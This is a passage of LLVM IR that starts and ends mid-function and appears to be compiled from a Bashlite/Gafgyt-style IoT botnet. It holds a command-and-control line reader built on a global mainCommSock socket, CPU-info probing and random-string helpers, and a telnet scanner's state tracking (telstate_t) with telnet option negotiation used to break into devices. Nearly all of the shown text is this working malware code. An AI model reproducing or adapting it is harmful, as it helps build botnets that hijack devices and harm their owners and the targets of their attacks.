  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9

; <label>:37:                                     ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37
  br label %43

; <label>:41:                                     ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4

; <label>:24:                                     ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

; <label>:37:                                     ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

; <label>:42:                                     ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

; <label>:50:                                     ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

; <label>:54:                                     ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #10
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #10
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

; <label>:64:                                     ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

; <label>:72:                                     ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

; <label>:76:                                     ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.307, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %82, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %84

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.308, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %82

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22

; <label>:42:                                     ; preds = %37
  br label %43

; <label>:43:                                     ; preds = %63, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #10
  %47 = sub i64 %46, 1
  %48 = getelementptr inbounds i8, i8* %44, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 13
  br i1 %51, label %61, label %52

; <label>:52:                                     ; preds = %43
  %53 = load i8*, i8** %6, align 8
  %54 = load i8*, i8** %6, align 8
  %55 = call i64 @strlen(i8* %54) #10
  %56 = sub i64 %55, 1
  %57 = getelementptr inbounds i8, i8* %53, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br label %61

; <label>:61:                                     ; preds = %52, %43
  %62 = phi i1 [ true, %43 ], [ %60, %52 ]
  br i1 %62, label %63, label %69

; <label>:63:                                     ; preds = %61
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #10
  %67 = sub i64 %66, 1
  %68 = getelementptr inbounds i8, i8* %64, i64 %67
  store i8 0, i8* %68, align 1
  br label %43

; <label>:69:                                     ; preds = %61
  %70 = load i8*, i8** %6, align 8
  %71 = call i8* @strchr(i8* %70, i32 46) #10
  %72 = icmp ne i8* %71, null
  br i1 %72, label %73, label %76

; <label>:73:                                     ; preds = %69
  %74 = load i8*, i8** %6, align 8
  %75 = call i8* @strchr(i8* %74, i32 46) #10
  store i8 0, i8* %75, align 1
  br label %76

; <label>:76:                                     ; preds = %73, %69
  %77 = load i8*, i8** %3, align 8
  %78 = load i8*, i8** %6, align 8
  %79 = call i8* @strcpy(i8* %77, i8* %78) #2
  %80 = load i32, i32* %4, align 4
  %81 = call i32 @close(i32 %80)
  store i32 0, i32* %2, align 4
  br label %87

; <label>:82:                                     ; preds = %13
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:84:                                     ; preds = %8
  %85 = load i32, i32* %4, align 4
  %86 = call i32 @close(i32 %85)
  store i32 1, i32* %2, align 4
  br label %87

; <label>:87:                                     ; preds = %84, %76
  %88 = load i32, i32* %2, align 4
  ret i32 %88
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.307, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.308, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:21:                                     ; preds = %5
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @close(i32 %22)
  %24 = load i32, i32* %1, align 4
  ret i32 %24
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %88

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %83, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %87

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* @mainCommSock, align 4
  %55 = call i32 (i32, i8*, ...) @sockprintf(i32 %54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0))
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  br label %58

; <label>:58:                                     ; preds = %53
  %59 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #2, !srcloc !2
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  br label %67

; <label>:67:                                     ; preds = %58
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  br i1 %82, label %83, label %86

; <label>:83:                                     ; preds = %67
  %84 = load i32, i32* %13, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %13, align 4
  br label %50

; <label>:86:                                     ; preds = %67
  br label %87

; <label>:87:                                     ; preds = %86, %50
  br label %88

; <label>:88:                                     ; preds = %87, %33
  store i32 0, i32* %18, align 4
  %89 = load i8*, i8** %6, align 8
  store i8* %89, i8** %17, align 8
  br label %90

; <label>:90:                                     ; preds = %108, %88
  %91 = load i32, i32* %7, align 4
  %92 = add nsw i32 %91, -1
  store i32 %92, i32* %7, align 4
  %93 = icmp sgt i32 %91, 1
  br i1 %93, label %94, label %111

; <label>:94:                                     ; preds = %90
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i64 @recv(i32 %95, i8* %16, i64 1, i32 0)
  %97 = icmp ne i64 %96, 1
  br i1 %97, label %98, label %100

; <label>:98:                                     ; preds = %94
  %99 = load i8*, i8** %17, align 8
  store i8 0, i8* %99, align 1
  store i32 -1, i32* %4, align 4
  br label %114

; <label>:100:                                    ; preds = %94
  %101 = load i8, i8* %16, align 1
  %102 = load i8*, i8** %17, align 8
  %103 = getelementptr inbounds i8, i8* %102, i32 1
  store i8* %103, i8** %17, align 8
  store i8 %101, i8* %102, align 1
  %104 = load i8, i8* %16, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 10
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %100
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %18, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %18, align 4
  br label %90

; <label>:111:                                    ; preds = %107, %90
  %112 = load i8*, i8** %17, align 8
  store i8 0, i8* %112, align 1
  %113 = load i32, i32* %18, align 4
  store i32 %113, i32* %4, align 4
  br label %114

; <label>:114:                                    ; preds = %111, %98
  %115 = load i32, i32* %4, align 4
  ret i32 %115
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #2
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %16, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %8
  br label %8

; <label>:17:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %18

; <label>:18:                                     ; preds = %33, %17
  %19 = load i32, i32* %7, align 4
  %20 = load i32, i32* %6, align 4
  %21 = icmp slt i32 %19, %20
  br i1 %21, label %22, label %36

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %4, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8*, i8** %24, i64 %26
